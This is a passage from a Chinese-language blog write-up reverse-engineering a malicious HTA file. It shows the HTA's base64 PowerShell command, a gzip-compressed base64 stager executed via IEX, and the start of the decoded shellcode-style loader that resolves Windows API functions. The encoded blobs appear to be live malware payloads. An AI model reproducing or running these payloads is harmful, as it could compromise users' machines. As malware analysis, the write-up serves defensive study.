AbgBWAE4ANgBUAG4ANAA4AGMAYwB1AEoAWgA1AEYAVgA3AG8AcgBQAG4AZABtAFQAegByADgAWQBrAFcAVQBUAEcAcQBUAHIAbgA1ACsARwBKAGwAMQBiAEwAbQAwAG0ATABuAEkAcwBmAEMARgA4ADQAYQBPAGMAMABiAFYATgBNAHoAeABLAEYAegBFAE4ALwBDAHoAawB6AHcAdQBVAE4ATQAvAG8ANQBGAE4AQQBsADcAKwBxAFMAWQA3AEYAMwBuAFQAcgBKACsAZABFAEQASABrAFAAdwBTAHUAZwBCAFAAKwB6AE0ANgBjAGMARgB2AEsASwBxADEASQBIADgARAB1ADkAQQAwADIAdgAxADMARABNADYARQBYADYAZgBMAFMAUwB5ACsANwBwAGUAOAByAGwAaABvADMAQwBzAE0AagAxAEkAegBqAG4AdQBNAGoAcABGAE4AbQBVAEYARABuAFIARABhADMAegBrAGgAZwB4AEwAeAB2AG0ALwAzAFoAWABqAFcAeABtAFkAUgBTAHkAaQA3AGsAVgAvAHcARwBrADUANgAwAGIAbgBnAHMAbgBKAHMASwBRAFgAWQBCAGgAcABQAHMAVQBXADgAaABPAFUAUwBsAHkAYgBZAHYAUQBlAHEASgBiADUAcwBXAEYALwBJAGUAWQBOAEoAQgB0AHcANQBFAEQAUwAzAHYASQBDAGMAeQBrAFcATwBnAHMANQBVAHgAQQBpAHYALwBLAEQANwA2AGsAVQA2AFkANAB2AGsAMABkAGsATQA2AHEAawBHAHcAagBFADIAcgBPACsAVQBSAGwAZABFAE0AbQBKAGYAbAAvADQALwBiAGwAbgBKAHcATwBSAFkAcgBWAEIAYQBSADMAVABnAE0AQgBkAE4AdABqAFIAVwA1AGkAQgBRAHoAcQBXAHIANwA0AEMALwBIACsATwAvAGQAKwBMAGoARQAvAHUAZABrAEkANgBEAG0AUgBoAGUAdwBnAEwAdQBzAEoAUwA0ADkATABKAG8AbgBUAHkAKwBYAHAARABjAHMATQB1AFkAQQBCAGEAbgBMAGcATwBYAFUAVQAwAHIAdQBxAG4AcABXAHgAUQBsADUANABpAEgAWgBLAG8AbQA0AEgAZAAwAEYATAAyAHMAdgB0AFgAVgBzAGEAdwBiAE8ASABSADkAagBKAFUAcQAvAFgARwBmAHIAMQBZAFEAOQBMADAAWABPAC8AWABlADYAcwBsAGMARgBEAHMAeAByAEYAawBSAEsATgA2AG0AVgBCAEwAbwBQAGMAYwBkAGUAUwAxAHMAcgArADIAWgB2AGYAUgBrADcAMQBsAHYAagBLAFgAbwBPADUAOABIADcAWABEAHAAdgBLAHYAaQBtADIASwB6AHQAUAB2AGoATwB0AHgANwBPAGQAawAvADcAQQBpAEcAKwBOAG0AUwBMAGYARwB5ADIANQAyAHAANgBFAGMAaQByAGYAVgB2AFoAMQBlAGQAZAA0ADkARwBEADgAaAA3AEoAdgBlAEIAMwBRAGUANwBqAHoAMwBYAHAATQBxAGwAVABxADMATgBGAFoARAA4AGMAQwBlADYARABJAFAAQwBUAGQAeQBSAGUAOQBmAE4AdQBhAEoARgBwAHYASQB2AG0AYQA3AHAASwBlAGMAVAB1AFEATwA5AHEAeABJAHIARgBEAG0AYgBTAEgAWgBTAEsARgBDAHoATABaAFMAVQBMAGYANgBQAG8AUQBwAHkASwBZACsAcAAzAGIAUwBYAFMAOQBuAHUAQgBYAE4AdABwAGEANgBoAGEAMwB0AFIANwBwADcAaAA1AHEANQBGAGgASgBaAEsAMABLAE8AQgB6ADAAUgBOADMATQA3ADgAZwBCAHoAKwBRAFkAegA3AFIAZQAwAHAANQByAEwAYgBDADcAaQA2AFoAbQB0AGEAMwBxAEEAdABqAFcAeQBTAEUAbQA0AC8AQwA1AE0AMgBKAHoAbwBZACsAYwBhAHAASwA0ADEAWQBhAHkAVgBRADQAOQA3AEwAUABKAHIASABNAFgAbwBLAFQAaAA5AHkAeABxADEATgBjAHMAMQBlADMAMABGAG0AYgBuAFUAVwBJAG4ALwAzAFIAOQBtAEIAQwB3AGIAYgBkAEgAegBTADcAWQBkAGgAdQBxAEMAcgBsAEEATgBaAG0ATwBRAGEAWQBiAFcAbQBEAHIASQBkAGcAcAA0AEcATgB5AHQAOABXAEMARgBxAHYARwBzAEsATwBOAEcAdQByAFUARQBEAHYASAB1AHEATgBaAFcARABCAG4AYQAwAEcAcgAwAGMATgA4ADEAaABDADAAeAA4AFoAbQBhAE0ANQBGAGIAegB3AHoAaQBZAE8AYwB1AG8AVQBIAHQAWgBoAFUATwBtAHgAUgA2AFIAdwBXAGMAYwAwAHkAWgBtAFIASABwAHYANgBCAHUATwBJAHoAcQBTAHgAaQBFAHQAZABzADUARAB3ADYAbwBrAG0AQwBSAGkAdgBzAEsASQBkAEYASwBMAHAAcQBTAHgARQBXAGcANgBFAHQAUABjADkAZgBoADYAMwBSAEIAQwAvAEUAUwBrADIAZABqAHYAMwArAHEASwB5AG8AYwBsAHcAZQBpAFQARQBUAFIAMQBKAHQATgBMAEIASgBkAHoAQgArAGIATABWAEUATABjAEkAdAAzAHgARQBQAG8AUwBZAGQAegBDAGEAQgBmAEEAegBMAGgALwBGAFkAMQBCAGkASgAxAFcAbAB6AHEATQB4AEYAZwBRAHoAMQBWADUATABhAHkAMgB5ADAAUgBGAFUAegBwAGcAdABCAHIATgBUADMAZQBLAEEATwBtADAATgBWAGsAegBmAHEAVwBCAG8ATwB1AGoAMwByAGQAUwBzADcAYwBRAFAASABpACsAMwBjADEAYQBxAHkAOABIAGkAawBzADMAQQBxAHgAKwB5ADQASABuAGoAagBlAFUAdgBzAHkAcwBDAGIAaABlAE8AYgBjADEAZAA2AHgAbQAxAGkARwBWAE4AaQA0AFMAbAArAG4AagB1ADMAQQBuAEkAbgBPAHoAeABiAHgARQAyAFgATwBMAGkATgBuAHgAZABUAGYANwA4AHcAbABUAGEASwBOADAARgBEAC8ALwAvAGoATgA2ADkAMABqAHIAUgBPAC8AcwBDAEMAZgBTADkAdgBjAEEAOABMADUAYQA3AGMAcQBwAHQAZwBuADkAWQByAGkAOQAyADgAMQBUAGsAMAAzAGIAbwBBAHYAcgBwAHoAVgAzAGEAYgBUAG8AZQBSAGkAbgArAEwAWABMAG0AQwB4AFoAcQB3AGcATABXAG0ATQA5AGsAWgBsAFgAbQBqAFgAZwBrAFYARgBBAE0AZQBsAHQAWQByADEAMQBDAGQAQQBFAC8AMQBxAGQAWgBUAGoAcwBEAG4AYwByAGgAVgBLAHUAcQBXAFMATwB4ACsASQB6AFIAYgB3AE0AUABZAEEAYgA0AEEAagA2AHcAdgBiAGkAZgBlAGgAYwBEAFQAUgBHADAAcQBpAFoAWgB5ADkAYwBCAFEAVQBNACsANABlAHIAdQAyAGQANAAyAEIAVgBlADAAYQAyADAAbQA0AHUASwArAHEAVQBWAGQAZwBSAHkAeAB0AFYAQgAxAHkATgBaAEEARwA1AFMASABrAFEAWgBPAEcAMABqAGkAdABEAC8AQQA4AHAAUgBWAHAANwBRAFgAUQBZAHgAegBTAGUALwBzAGYASABQAHoAZgAyAEkAeAA3AHEAegBsAFEAYQBhAEMASQBwAGYATgBmAHYAdgBEAHAAMwBmACsAMgBzAHIAdwArAHIAQwA2ADkAMgB0AHYANwBqAFgARQBBAGEAMABJAHQAcgBWAC8AWgB5AGgANgA5AHEAMQBxAGYATgBVAEEAcQBDAHMASQBOAHMAcQBHAGEAUQBSAE4AegB1AFkASgBrAEwANQBEAFAAcgBVAGoAZgBzADEASwBOAFEAdQBIAGoANwB2AG0AVgBCAGkANgAxAG8AYgBPAEUAMwB2AE4AUwB1AEUAWABiADkAbgBEAGEAUABIADMAUwB4AFUAQQByAGQAMgBxAHcAVgBuAEIAQgBqAFcARQBvAFYARAA0AGMAOABkAHkAYgBJAEgAUgBNAHAANQBpAE0AYQBMADMATwBHAG8AeAB6AGgASgBjACsANgB5AEwANAA5AGUAcwBDAHcAaQB1ACsAQQA3AEYASABYAFoATgB0AGkAbAB6ADUASQBKAFQATAA1AGYAUwAvAFcAdQBaAHoAdgB3ADkATAB3AC8ATwBUAHcAcAB1ADUAWQB0AHAAZwB2AGYAUABrAC8AVQA1ADIAdABoAE4ALwBSAGoAKwBJAFgASQBmACsARAB4AFAAdwAwADYAYgAvAEcAZABvAFUAdgBLAHgASABlADQATQB1AGMAKwBoAGoAdgBQAGgAYwAvAGwAcwB1AHAANgB5ADUAZAAvAE8AaABkAFkAUQB2AEUATAByAGoASABqAEwAdQBoAFUAQgAxAGQAcgBQADEARABQAGgAYwB5AGUANwBmAHcAagBYAGkATwBVAFcAYQBjAGQAZQBJACsAOABIAGQAUQBIAGgAaQBLAEYAVABnAG0AeQBVAHcAbwAvAFEAeQA1AGsANgBmAFkATgArADUARwBGAGsAbgB4AGUALwBjAGsARwBJAEsATABmAFIATgB4AHoATwBBAHAAUgBSADYAcQB0AFIAMABaAGkAUQBWAGgAcgBsAC8AQQB1ADcARABCAGoAUABUAEQAUQBBAEEAIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br><br>var_func<br>self.close<br>&lt;/script&gt;<br><br></code></pre></td></tr></table></figure><p>首先来看hta的源码，使用VBS写的，是一种微软环境下的轻量级的解释型语言，同时它又是asp动态网页默认的编程语言，但这个不是重点，其中最令我们关注的是写入shell命令中的这一长短base64编码的东西，我们先解码看看是什么</p><p><img src="https://s2.loli.net/2022/08/16/4PVe1bmfKvyXRoF.png" alt="base64解码"></p><p>解码完了之后是这一段，把<code>.</code>替换掉，得到这一段代码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$s</span>=<span class="hljs-built_in">New-Object</span> IOMemoryStream(,[<span class="hljs-type">Convert</span>]::FromBase64String(<span class="hljs-string">&quot;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&quot;</span>));<span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> IOStreamReader(<span class="hljs-built_in">New-Object</span> IOCompressionGzipStream(<span class="hljs-variable">$s</span>,[<span class="hljs-type">IOCompressionCompressionMode</span>]::Decompress)))ReadToEnd();<br></code></pre></td></tr></table></figure><p>我们还是先把中间的一长串拿去base64解密，但结果是一堆乱码，可惜<br>那我们来看看其他的<br>其中有这几个函数比较值得关注</p><blockquote><p><code>IOMemoryStream(,[Convert]::FromBase64String())</code>将字符串base64编码后，存入到流中<br><code>IOCompressionGzipStream()</code>使用Gzip压缩<br>最后通过Invoke-Expression（运行一个以字符串形式提供的 Windows PowerShell 表达式）将字符串当作命令执行</p></blockquote><p>网上有现成的脚本，我们直接拿去跑试一下<a href="http://chernodv.blogspot.com.cy/2014/12/powershell-compression-decompression.html">脚本原文链接</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$data</span> = [<span class="hljs-type">System.Convert</span>]::FromBase64String(<span class="hljs-string">&#x27;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&#x27;</span>)<br><span class="hljs-variable">$ms</span> = <span class="hljs-built_in">New-Object</span> System.IO.MemoryStream<br><span class="hljs-variable">$ms</span>.Write(<span class="hljs-variable">$data</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$data</span>.Length)<br><span class="hljs-variable">$ms</span>.Seek(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) | <span class="hljs-built_in">Out-Null</span><br><span class="hljs-variable">$sr</span> = <span class="hljs-built_in">New-Object</span> System.IO.StreamReader(<span class="hljs-built_in">New-Object</span> System.IO.Compression.GZipStream(<span class="hljs-variable">$ms</span>, [<span class="hljs-type">System.IO.Compression.CompressionMode</span>]::Decompress))<br><span class="hljs-variable">$sr</span>.ReadToEnd() | <span class="hljs-built_in">set-clipboard</span><br></code></pre></td></tr></table></figure><p>该脚本首先经过base64解码，然后再进行gzip解压，来得到我们想要看到的hta的源码</p><blockquote><p>这里我犯了一个低级错误，在之前base64解码出来的结果里面，把多余的<code>.</code>都替换掉了，同时也将代码中原本的<code>.</code>也去掉了，故正确的代码应该长这样<br>当时也想到这个问题了，不知道为啥没有注意，挺怪的</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$s</span>=<span class="hljs-built_in">New-Object</span> IO.MemoryStream(,[<span class="hljs-type">Convert</span>]::FromBase64String(<span class="hljs-string">&quot;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&quot;</span>));<span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> IO.StreamReader(<span class="hljs-built_in">New-Object</span> IO.Compression.GzipStream(<span class="hljs-variable">$s</span>,[<span class="hljs-type">IO.Compression.CompressionMode</span>]::Decompress))).ReadToEnd();<br></code></pre></td></tr></table></figure><p>结果会自动保存在剪贴板里<br>得到解压后的源码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2</span><br><br><span class="hljs-variable">$DoIt</span> = <span class="hljs-string">@&#x27;</span><br><span class="hljs-string">function func_get_proc_address &#123;</span><br><span class="hljs-string">Param ($var_module, $var_procedure)</span><br><span class="hljs-string">$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span><br><span class="hljs-string">$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span><br><span class="hljs-string">return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), 